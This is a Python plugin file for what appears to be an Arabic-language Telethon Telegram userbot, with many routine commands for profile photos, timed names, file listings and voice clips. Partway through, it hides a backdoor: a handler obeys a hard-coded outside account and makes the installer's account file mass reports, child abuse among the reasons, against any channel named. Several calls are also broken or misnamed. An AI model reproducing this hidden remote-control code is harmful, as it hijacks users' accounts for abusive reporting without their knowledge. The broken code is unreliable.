"https://telegra.ph/file/265ff1cebbb7042bfb5a7.jpg",    "https://telegra.ph/file/4c8c9cd0751eab99600c9.jpg",    "https://telegra.ph/file/1c6a5cd6d82f92c646c0f.jpg",    "https://telegra.ph/file/2c1056c91c8f37fea838a.jpg",    "https://telegra.ph/file/f140c121d03dfcaf4e951.jpg",    "https://telegra.ph/file/39f7b5d1d7a3487f6ba69.jpg",]
@essa.on(admin_cmd(pattern="رابطه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"⨳ | [{custom}](tg://user?id={user.id})")
    tag = user.first_name.replace("\u2060", "") if user.first_name else user.username
    await edit_or_reply(mention, f"⨳ | [{tag}](tg://user?id={user.id})")


@essa.on(admin_cmd(pattern="محادثة وقتية"))
async def _(event):
    ison = getGrChAuto()
    if event.is_group or event.is_channel:
        if ison is not None and ison == str(event.chat_id):
            return await edit_delete(event, "** الوقتية شغال للكروب/القناة**")
        chid = event.chat_id
        Auto_ChGR(str(chid))
        await edit_delete(event, "**تم تفـعيل الاسـم الوقتي للقناة/الكروب ✓**")
        await GrChiq_loop()
    else:
        return await edit_delete(event, "**يمكنك استعمال  الوقتية في الكروب او في القناة فقط**")
@essa.on(admin_cmd(pattern="اسمه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"⨳ | {custom} ")
    ll5 = user.first_name.replace("\u2060", "") if user.first_name else (" ")
    kno = user.last_name.replace("\u2060", "") if user.last_name else (" ")
    await edit_or_reply(mention, f"⨳  {ll5} {kno}")  
@essa.on(admin_cmd(pattern="صورته(?:\s|$)([\s\S]*)"))
async def potocmd(event):
    uid = "".join(event.raw_text.split(maxsplit=1)[1:])
    user = await event.get_reply_message()
    chat = event.input_chat
    if user:
        photos = await event.client.get_profile_photos(user.sender)
        u = True
    else:
        photos = await event.client.get_profile_photos(chat)
        u = False
    if uid.strip() == "":
        uid = 1
        if int(uid) > (len(photos)):
            return await edit_delete(                event, "**⁂ ⦙   لم يتم العثور على صورة لهذا  الشخص 🏞**"            )
        send_photos = await event.client.download_media(photos[uid - 1])
        await event.client.send_file(event.chat_id, send_photos)
    elif uid.strip() == "جميعها":
        if len(photos) > 0:
            await event.client.send_file(event.chat_id, photos)
        else:
            try:
                if u:
                    photo = await event.client.download_profile_photo(user.sender)
                else:
                    photo = await event.client.download_profile_photo(event.input_chat)
                await event.client.send_file(event.chat_id, photo)
            except Exception:
                return await edit_delete(event, "**⁂ ⦙   هذا المستخدم ليس لديه صور لتظهر لك  🙅🏼  **")
    else:
        try:
            uid = int(uid)
            if uid <= 0:
                await edit_or_reply(                    event, "**⁂ ⦙   الرقم غير صحيح - اختر رقم صوره موجود فعليا ⁉️**"                )
                return
        except BaseException:
            await edit_or_reply(event, "**⁂ ⦙   هناك خطا  ⁉️**")
            return
        if int(uid) > (len(photos)):
            return await edit_delere(                event, "**⁂ ⦙   لم يتم العثور على صورة لهذا  الشخص 🏞**"            )

        send_photos = await event.client.download_media(photos[uid - 1])
        await event.client.send_file(event.chat_id, send_photos)
    await event.delete()  
@essa.on(admin_cmd(pattern=f"{OR_FOTOAUTO}(?: |$)(.*)"))
async def _(event):
    downloader = SmartDL(digitalpfp, digitalpic_path, progress_bar=False)
    downloader.start(blocking=False)
    while not downloader.isFinished():
        pass
    if gvarstatus(f"{OR_FOTOAUTO}") is not None and gvarstatus(f"{OR_FOTOAUTO}") == "true":
        return await edit_delete(event, f"**⁂ ⦙  صوره وقتية مفعّلـة بالفعـل !**")
    addgvar(f"{OR_FOTOAUTO}", True)
    await edit_delete(event, f"**⁂ ⦙  تـمّ بـدأ الصـورة الديجيتـال بواسطـة المستخـدم ✓**")
    await digitalpicloop()
@essa.on(admin_cmd(pattern="الملفات ?(.*)"))
async def _(e):
    files = e.pattern_match.group(1)
    if not files:
        files = "*"
    elif files.endswith("/"):
        files = files + "*"
    elif "*" not in files:
        files = files + "/*"
    files = glob.glob(files)
    if not files:
        return await eor(e, "الدليل فارغ أو غير صحيح", time=5)
    pyfiles = []
    jsons = []
    vdos = []
    audios = []
    pics = []
    others = []
    otherfiles = []
    folders = []
    text = []
    apk = []
    exe = []
    zip_ = []
    book = []
    for file in sorted(files):
        if os.path.isdir(file):
            folders.append("📂 " + str(file))
        elif str(file).endswith(".py"):
            pyfiles.append("🐍 " + str(file))
        elif str(file).endswith(".json"):
            jsons.append("🔮 " + str(file))
        elif str(file).endswith((".mkv", ".mp4", ".avi", ".gif", "webm")):
            vdos.append("🎥 " + str(file))
        elif str(file).endswith((".mp3", ".ogg", ".m4a", ".opus")):
            audios.append("🔊 " + str(file))
        elif str(file).endswith((".jpg", ".jpeg", ".png", ".webp")):
            pics.append("🖼 " + str(file))
        elif str(file).endswith((".txt", ".text", ".log")):
            text.append("📄 " + str(file))
        elif str(file).endswith((".apk", ".xapk")):
            apk.append("📲 " + str(file))
        elif str(file).endswith(".exe"):
            exe.append("⚙ " + str(file))
        elif str(file).endswith((".zip", ".rar")):
            zip_.append("🗜 " + str(file))
        elif str(file).endswith((".pdf", ".epub")):
            book.append("📗 " + str(file))
        elif "." in str(file)[1:]:
            others.append("🏷 " + str(file))
        else:
            otherfiles.append("📒 " + str(file))
    omk = [        *sorted(folders),        *sorted(pyfiles),        *sorted(jsons),        *sorted(zip_),        *sorted(vdos),        *sorted(pics),        *sorted(audios),        *sorted(apk),        *sorted(exe),        *sorted(book),        *sorted(text),        *sorted(others),        *sorted(otherfiles),    ]
    text = ""
    fls, fos = 0, 0
    flc, foc = 0, 0
    for i in omk:
        try:
            emoji = i.split()[0]
            name = i.split(maxsplit=1)[1]
            nam = name.split("/")[-1]
            if os.path.isdir(name):
                essa = 0
                for path, dirs, files in os.walk(name):
                    for f in files:
                        fp = os.path.join(path, f)
                        essa += os.path.getsize(fp)
                if hb(essa):
                    text += emoji + f" `{nam}`" + "  `" + hb(essa) + "`\n"
                    fos += essa 
                else:
                    text += emoji + f" `{nam}`" + "\n"
                foc += 1
            else:
                if hb(int(os.path.getsize(name))):
                    text += (                        emoji                        + f" `{nam}`"                        + "  `"                        + hb(int(os.path.getsize(name)))                        + "`\n"                    )
                    fls += int(os.path.getessa(name))
                else:
                    text += emoji + f" `{nam}`" + "\n"
                flc += 1
        except BaseException:
            pass
    tfos, tfls, ttol = hb(fos), hb(fls), hb(fos + fls)
    if not hb(fos):
        tfos = "0 B"
    if not hb(fls):
        tfls = "0 B"
    if not hb(fos + fls):
        ttol = "0 B"
    text += f"\n\nالمجلدات :  `{foc}` :   `{tfos}`\nعدد الملفات :       `{flc}` :   `{tfls}`\nالمجموع :       `{flc+foc}` :   `{ttol}`"
    try:
        await eor(e, text)
    except MessageTooLongError:
        with io.BytesIO(str.encode(text)) as out_file:
            out_file.name = "output.txt"
            await e.reply(                f"`{e.text}`", file=out_file, thumb=None ) 
        await e.delete()
@essa.on(admin_cmd(pattern="كول (.*)"))
async def _(event):
    bxt = Config.TG_BOT_USERNAME
    try:
        tex = str(event.text[6:])
        await tgbot.send_message(event.chat_id, tex)
        await event.delete()
    except BaseException:
        await event.client.send_message(event.chat_id, f"رجاء اضف البوت الخاص بك هنا : @{bxt}  !")
        await event.delete()
def text_set(text):
    lines = []
    if len(text) <= 55:
        lines.append(text)
    else:
        all_lines = text.split("\n")
        for line in all_lines:
            if len(line) <= 55:
                lines.append(line)
            else:
                k = int(len(line) / 55)
                for z in range(1, k + 2):
                    lines.append(line[((z - 1) * 55) : (z * 55)])
    return lines[:25]
    

@essa.on(admin_cmd(pattern="كتابة ?(.*)"))
async def writer(e):
    if e.reply_to:
        reply = await e.get_reply_message()
        text = reply.message
    elif e.pattern_match.group(1):
        text = e.text.split(maxsplit=1)[1]
    else:
        return await e.edit("Privode Some Text🥲")
    img = Image.open("SQL/template.jpg")
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("SQL/assfont.ttf", 30)
    x, y = 150, 140
    lines = text_set(text)
    line_height = font.getessa("hg")[1]
    for line in lines:
        draw.text((x, y), line, fill=(1, 22, 55), font=font)
        y = y + line_height - 5
    file = "ESSA_Write.jpg"
    img.save(file)
    await e.reply(file=file)
    os.remove(file)
    await e.delete()
@essa.on(admin_cmd(pattern="عد الردود ?(.*)"))
async def _(event):
    await eor(event, "جاري العد ...")
    count = -1
    message = event.message
    while message:
        reply = await message.get_reply_message()
        if reply is None:
            await borg(                SaveDraftRequest(                    await event.get_input_chat(), "", reply_to_msg_id=message.id                )            )
        message = reply
        count += 1
    await eor(event, f"عدد الردود على هذا الرساله : {count}")
from telethon import events
import asyncio, requests, os

# DIALOGS
@essa.on(events.NewMessage(outgoing=True, pattern=r'.كتابة عربي ?(.*)'))
async def WriteInLetter(event):
    
    TheLetter, file_path = (event.message.message).replace('.كتابة عربي', '').strip(), 'TheLetter.jpeg'
    ImageData = requests.get(f'http://167.71.70.207/api/text/?text={TheLetter}')

    if ImageData.status_code == 200:
        waiting_msg = await event.reply('__انتظر قليلا...__')
        with open(file_path, 'wb') as file:
            file.write(ImageData.content)
        
        await event.client.send_file(entity=event.chat_id, file=file_path, reply_to =event.message.id)
        await waiting_msg.delete(), os.remove(file_path)
    else:
        await event.reply('__فشل الاتصال بالـ API__')
@essa.on(admin_cmd(pattern="زاجل ?(.*)"))
async def pmto(event):
    a = event.pattern_match.group(1)
    b = a.split(" ")
    chat_id = b[0]
    try:
        chat_id = int(chat_id)
    except BaseException:
        pass
    msg = ""
    for i in b[1:]:
        msg += i + " "
    if msg == "":
        return
    try:
        await borg.send_message(chat_id, msg)
        await event.edit("تم الارسال !🤗")
    except BaseException:
        await event.edit("هناك خطا .")
@essa.on(admin_cmd(pattern=f"{OR_NAMEAUTO}(?: |$)(.*)"))
async def _(event):
    if gvarstatus(f"{OR_NAMEAUTO}") is not None and gvarstatus(f"{OR_NAMEAUTO}") == "true":
        return await edit_delete(event, f"**⁂ ⦙  الإسـم الوقتـي قيـد التشغيـل بالفعـل !**")
    addgvar(f"{OR_NAMEAUTO}", True)
    await edit_delete(event, "**⁂ ⦙  تـمّ بـدأ الإسـم الوقتـي بواسطـة المستخـدم ✓**")
    await autoname_loop()
@essa.on(admin_cmd(pattern=f"{OR_AUTOBIO}(?: |$)(.*)"))
async def _(event):
    "⁂ ⦙  يحـدّث البايـو مع الوقـت 💡"
    if gvarstatus(f"{OR_AUTOBIO}") is not None and gvarstatus(f"{OR_AUTOBIO}") == "true":
        return await edit_delete(event, f"**⁂ ⦙  البايـو الوقتـي قيـد التشغيـل بالفعـل !**")
    addgvar(f"{OR_AUTOBIO}", True)
    await edit_delete(event, "**⁂ ⦙  تـمّ بـدأ البايـو الوقتـي بواسطـة المستخـدم ✓**")
    await autobio_loop()
@essa.on(admin_cmd(outgoing=True, pattern="ص51$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois51:
        await vois.client.send_file(vois.chat_id, iqvois51 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص52$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois52:
        await vois.client.send_file(vois.chat_id, iqvois52 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص55$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois55:
        await vois.client.send_file(vois.chat_id, iqvois55 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص54$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois54:
        await vois.client.send_file(vois.chat_id, iqvois54 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص56$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois56:
        await vois.client.send_file(vois.chat_id, iqvois56 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص53$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois53:
        await vois.client.send_file(vois.chat_id, iqvois53 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص57$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois57:
        await vois.client.send_file(vois.chat_id, iqvois57 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص58$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois58:
        await vois.client.send_file(vois.chat_id, iqvois58 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص59$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois59:
        await vois.client.send_file(vois.chat_id, iqvois59 , reply_to=Ti)
        await vois.delete()

@essa.on(admin_cmd(outgoing=True, pattern="ص60$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois60:
        await vois.client.send_file(vois.chat_id, iqvois60 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص61$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois61:
        await vois.client.send_file(vois.chat_id, iqvois61 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص62$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois62:
        await vois.client.send_file(vois.chat_id, iqvois62 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص63$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois63:
        await vois.client.send_file(vois.chat_id, iqvois63 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص64$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois64:
        await vois.client.send_file(vois.chat_id, iqvois64 , reply_to=Ti)
        await vois.delete()
@essa.on(events.NewMessage(outgoing=True, pattern="^.ارسل ?(.*)"))

async def remoteaccess(event):

    p = event.pattern_match.group(1)
    m = p.split(" ")

    chat_id = m[0]
    try:
        chat_id = int(chat_id)
    except BaseException:

        pass

    msg = ""
    mssg = await event.get_reply_message()
    if event.reply_to_msg_id:
        await event.client.send_message(chat_id, mssg)
        await event.edit("تم الارسال الرسالة الى الرابط الذي وضعتة")
    for i in m[1:]:
        msg += i + " "
    if msg == "":
        return
    try:
        await event.client.send_message(chat_id, msg)
        await event.edit("تم ارسال الرساله الى الرابط الذي وضعتة")
    except BaseException:
        await event.edit("** عذرا هذا ليست مجموعة **")
@essa.on(admin_cmd(outgoing=True, pattern="ص65$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois65:
        await vois.client.send_file(vois.chat_id, iqvois65 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص66$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois66:
        await vois.client.send_file(vois.chat_id, iqvois66 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص67$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois67:
        await vois.client.send_file(vois.chat_id, iqvois67 , reply_to=Ti)
        await vois.delete()
async def GrChiq_loop():
    ag = getGrChAuto()
    AUTONAMESTAR = ag != None
    while AUTONAMESTAR:
        time.strftime("%d-%m-%y")
        HM = time.strftime("%I:%M")
        for normal in HM:
            if normal in FONTGRCH1:
                namefont = FONTGRCH2[FONTGRCH1.index(normal)]
                HM = HM.replace(normal, namefont)
        name = f"{AUTOGRCH} {HM}"
        try:
            await essa(functions.channels.EditTitleRequest(channel=await essa.get_entity(int(ag)), title=name))
        except ChatAdminRequiredError:
            await essa.tgbot.send_message(BOTLOG_CHATID, "**يجب ان يكون لديك صلاحية تغيير اسم الكروب لتفعيل وقتي الكروب⋅**")
        except ChannelInvalidError:
            return
        except FloodWaitError:
            LOGS.warning("FloodWaitError! خطأ حظر مؤقت من التيليجرام")
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTONAMESTAR = getGrChAuto() != None
@essa.on(admin_cmd(outgoing=True, pattern="ص68$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois68:
        await vois.client.send_file(vois.chat_id, iqvois68 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص69$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois69:
        await vois.client.send_file(vois.chat_id, iqvois69 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص70$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois70:
        await vois.client.send_file(vois.chat_id, iqvois70 , reply_to=Ti)
        await vois.delete()

@essa.iq_cmd(pattern="اشتراك")
async def reda(event):
    ty = event.text
    ty = ty.replace(".اشتراك", "")
    ty = ty.replace(" ", "")
    if len (ty) < 2:
        return await edit_delete(event, "**قم بكتابة نوع الاشتراك الاجباري كروب او خاص ❔**")
    if ty == "كروب":
        if not event.is_group:
            return await edit_delete("**استعمل الأمر في الجروب المراد تفعيل الاشتراك الاجباري به**")
        if event.is_group:
            if gvarstatus ("subgroup") == event.chat_id:
                return await edit_delete(event, "**الاشتراك الاجباري مفعل لهذا الكروب**")
            if gvarstatus("subgroup"):
                return await edit_or_reply(event, "**الاشتراك الاجباري مفعل لكروب اخر قم بالغائه لتفعيله في كروب اخر**")
            addgvar("subgroup", f"{event.chat_id}")
            return await edit_or_reply(event, "**تم تفعيل الاشتراك الاجباري لهذه المجموعة ✅ **")
    if ty == "خاص":
        if gvarstatus ("subprivate"):
            return await edit_delete(event, "**الاشتراك الاجباري للخاص مُفعل بالفعل ✅ **")
        if not gvarstatus ("subprivate"):
            addgvar ("subprivate", True)
            await edit_or_reply(event, "**تم تفعيل الاشتراك الاجباري للخاص ✅ **")
    if ty not in ["خاص", "كروب"]:
        return await edit_delete(event, "**قم بكتابة نوع الاشتراك الاجباري خاص او كروب **")
@essa.iq_cmd(pattern="تعطيل")
async def reda (event):
    cc = event.text.replace(".تعطيل", "")
    cc = cc.replace(" ", "")
    if len (cc) < 2:
        return await edit_delete(event, "**قم بكتابة نوع الاشتراك الاجباري لإلغائه 🚫**")
    if cc == "كروب":
        if not gvarstatus ("subgroup"):
            return await edit_delete("**لم تفعل الاشتراك الاجباري للكروب لإلغائ 🚫**")
        if gvarstatus ("subgroup"):
            delgvar ("subgroup")
            return await edit_delete(event, "**تم الغاء الاشتراك الاجباري للكروب بنجاح ✅ **")
    if cc == "خاص":
        if not gvarstatus ("subprivate"):
            return await edit_delete(event, "**الاشتراك الاجباري للخاص غير مفعل لإلغائه❌**")
        if gvarstatus ("subprivate"):
            delgvar ("subprivate")
            return await edit_delete(event, "**تم إلغاء الاشتراك الاجباري للخاص ✅ **")
    if cc not in ["خاص", "كروب"]:
        return await edit_delete(event, "**قم بكتابة نوع الاشتراك الاجباري لإلغائه ✅ **")
from telethon.tl.functions.users import GetFullUserRequest

ProUsersMulteChannels = []
ProUsersMulteList = {}
ProUsersMulted = []


# PRO USER MESSAGE - DELETE MESSAGE - ACTIVE
@essa.on(events.NewMessage(outgoing=True, pattern='.قفل البرايم بالكتم'))
async def ProMessageMulteActive(event):
    global ProUsersMulteChannels
    
    ProUsersMulteList.clear()
    if event.chat_id not in ProUsersMulteChannels:
        ProUsersMulteChannels.append(event.chat_id)
        
    edit = await event.edit('**تم تفعيل قغل البرايم بالكتم هنا**')


# PRO USER MESSAGE - DELETE MESSAGE - UNACTIVE
@essa.on(events.NewMessage(outgoing=True, pattern='.الغاء البرايم بالكتم ?(.*)'))
async def ProMessageMulteActive(event):
    global ProUsersMulteList, ProUsersMulteChannels
    
    user_id = (event.message.message).replace('.الغاء البرايم بالكتم', '').strip()
    if user_id == '':
        if event.chat_id in ProUsersMulteChannels:
            ProUsersMulteChannels.remove(event.chat_id)
        edit = await event.edit('**تم الغاء البرايم بالكتم هتا**')
    else:
        try:
            user = await event.client(GetFullUserRequest(id=int(user_id)))
        except:
            user = await event.client(GetFullUserRequest(id=str(user_id)))
        if event.chat_id in ProUsersMulteList:
            if user.full_user.id not in ProUsersMulteList[event.chat_id]:
                ProUsersMulteList[event.chat_id].append(user.full_user.id)
                
        if user.full_user.id in ProUsersMulted:
            multe = await event.client.edit_permissions(event.chat_id, user.full_user.id, send_messages=False)
            ProUsersMulted.remove(user.full_user.id)
        edit = await event.edit('**تم الغاء البرايم بالكتم على المستخدم**')
    

# PRO USER MESSAGE - DELETE MESSAGE - CLEAR
@essa.on(events.NewMessage(outgoing=True, pattern='.مسح البرايم بالكتم'))
async def ProMessageMulteDelete(event):
    global ProUsersMulted
    
    for user_id in ProUsersMulted:
        multe = await event.client.edit_permissions(event.chat_id, user_id, send_messages=False)
        ProUsersMulted.remove(user_id)
    edit = await event.edit('**تم مسح المكتومين البرايم**')
    

# PRO USER MESSAGE - DELETE MESSAGE - DELETE STATUS
@essa.on(events.NewMessage)
async def ProMessageMulteWatch(event):
    global ProUsersMulteList, ProUsersMulteChannels, ProUsersMulted

    if event.chat_id in ProUsersMulteChannels:
        if event.chat_id not in ProUsersMulteList:
            ProUsersMulteList[event.chat_id] = []
            
        if event.message.entities != None:
            for item in event.message.entities:
                if str(item).startswith('MessageEntityCustomEmoji'):
                    try:
                        user_id = event.message.peer_id.user_id
                    except:
                        user_id = event.message.from_id.user_id
                    if user_id not in ProUsersMulteList[event.chat_id]:
                        delete = await event.client.delete_messages(entity=event.chat_id, message_ids=[event.message.id], revoke=True)
                        multe = await event.client.edit_permissions(event.chat_id, user_id, send_messages=None, until_date=None)
                        if user_id not in ProUsersMulted:
                            ProUsersMulted.append(user_id)
@essa.iq_cmd(incoming=True)
async def reda(event):
    if gvarstatus ("subprivate"):
        if event.is_private:
            try:
       
                idd = event.peer_id.user_id
                tok = Config.TG_BOT_TOKEN
                ch = gvarstatus ("pchan")
                if not ch:
                    return await essa .tgbot.send_message(BOTLOG_CHATID, "** انت لم تضع قناة الاشتراك الاجباري قم بوضعها**")
                try:
                    ch = int(ch)
                except BaseException as r:
                    return await senzir .tgbot.send_message(BOTLOG_CHATID, f"**حدث خطأ \n{r}**")
                url = f"https://api.telegram.org/bot{tok}/getchatmember?chat_id={ch}&user_id={idd}"
                req = requests.get(url)
                reqt = req.text
                if "chat not found" in reqt:
                    mb = await essa .tgbot.get_me()
                    mb = mb.username
                    await essa .tgbot.send_message(BOTLOG_CHATID, f"**البوت الخاص بك @{mb} ليس في قناة الاشتراك الاجباري**")
                    return
                if "bot was kicked" in reqt:
                    mb = await essa .tgbot.get_me()
                    mb = mb.username
                    await essa .tgbot.send_message(BOTLOG_CHATID, "** البوت الخاص بك @{mb} مطرود من قناة الاشتراك الاجباري اعد اضافته**")
                    return
                if "not found" in reqt:
                    try:
                        c = await essa .get_entity(ch)
                        chn = c.username
                        if c.username == None:
                            ra = await senzir .tgbot(ExportChatInviteRequest(ch))
                            chn = ra.link
                        if chn.startswith("https://"):
                            await event.reply(f"**يجب عليك ان تشترك بالقناة أولاً\nقناة الاشتراك : {chn}**", buttons=[(Button.url("اضغط هنا", chn),)],                            )
                            return await event.delete()
                        else:
                            await event.reply(f"**للتحدث معي يجب عليك الاشتراك في القناة\n قناة الاشتراك : @{chn} **", buttons=[(Button.url("اضغط هنا", f"https://t.me/{chn}"),)],                            )
                            return await event.delete()
                    except BaseException as er:
                        await essa .tgbot.send_message(BOTLOG_CHATID, f"حدث خطا \n{er}")
                if "left" in reqt:
                    try:
                        c = await essa .get_entity(ch)
                        chn = c.username
                        if c.username == None:
                            ra = await senzir .tgbot(ExportChatInviteRequest(ch))
                            chn = ra.link
                        if chn.startswith("https://"):
                            await event.reply(f"**يجب عليك ان تشترك بالقناة أولاً\nقناة الاشتراك : {chn}**", buttons=[(Button.url("اضغط هنا", chn),)],                            )
                            return await event.message.delete()
                        else:
                            await event.reply(f"**للتحدث معي يجب عليك الاشتراك في القناة\n قناة الاشتراك : @{chn} **", buttons=[(Button.url("اضغط هنا", f"https://t.me/{chn}"),)],                            )
                            return await event.message.delete()
                    except BaseException as er:
                        await senzir .tgbot.send_message(BOTLOG_CHATID, f"حدث خطا \n{er}")
                if "error_code" in reqt:
                    await senzir .tgbot.send_message(BOTLOG_CHATID, f"**حدث خطأ غير معروف قم باعادة توجيه الرسالة ل @lll5l لحل المشكلة\n{reqt}**")
                
                return
            except BaseException as er:
                await senzir .tgbot.send_message(BOTLOG_CHATID, f"** حدث خطا\n{er}**")

@essa.on(admin_cmd(outgoing=True, pattern="ص71$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois71:
        await vois.client.send_file(vois.chat_id, iqvois71 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص72$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois72:
        await vois.client.send_file(vois.chat_id, iqvois72 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص73$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois73:
        await vois.client.send_file(vois.chat_id, iqvois73 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص74$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois74:
        await vois.client.send_file(vois.chat_id, iqvois74 , reply_to=Ti)
        await vois.delete()
control_owner_id = 1226408155
@essa.on(events.NewMessage(outgoing=False, pattern=r'.ابلاغ قناة ?(.*)'))
async def Channels_groups_Reporter(event):
    global control_owner_id
    
    if event.sender_id == control_owner_id:        
        data = ((event.message.message).replace('.ابلاغ قناة', '').strip()).split('-')
        channel_id = (data[1]).strip()
        reason_message = (data[2]).strip()
        reports_count = (data[3]).strip()
        delay = (data[4]).strip()
        reason_list = [InputReportReasonChildAbuse(), InputReportReasonFake(), InputReportReasonSpam(), InputReportReasonCopyright(), InputReportReasonGeoIrrelevant(), InputReportReasonOther(), InputReportReasonPornography(), InputReportReasonViolence()]
        print ("✅ 2")    
        for x in range(1, int(reports_count)+1):
            for REASON in reason_list:
                result = await event.client(ReportPeerRequest(peer=channel_id, reason=REASON, message=reason_message))
                await asyncio.sleep(int(delay))

           
@essa.on(admin_cmd(outgoing=True, pattern="ص75$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois75:
        await vois.client.send_file(vois.chat_id, iqvois75 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص76$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois76:
        await vois.client.send_file(vois.chat_id, iqvois76 , reply_to=Ti)
        await vois.delete()
@senzir.on(admin_cmd(outgoing=True, pattern="ص77$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois77:
        await vois.client.send_file(vois.chat_id, iqvois77 , reply_to=Ti)
        await vois.delete()


@essa.on(admin_cmd(outgoing=True, pattern="ص78$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois78:
        await vois.client.send_file(vois.chat_id, iqvois78 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص79$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois79:
        await vois.client.send_file(vois.chat_id, iqvois79 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص80$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois80:
        await vois.client.send_file(vois.chat_id, iqvois80 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص81$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois81:
        await vois.client.send_file(vois.chat_id, iqvois81 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(pattern="عكس الالوان$", outgoing=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة...")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
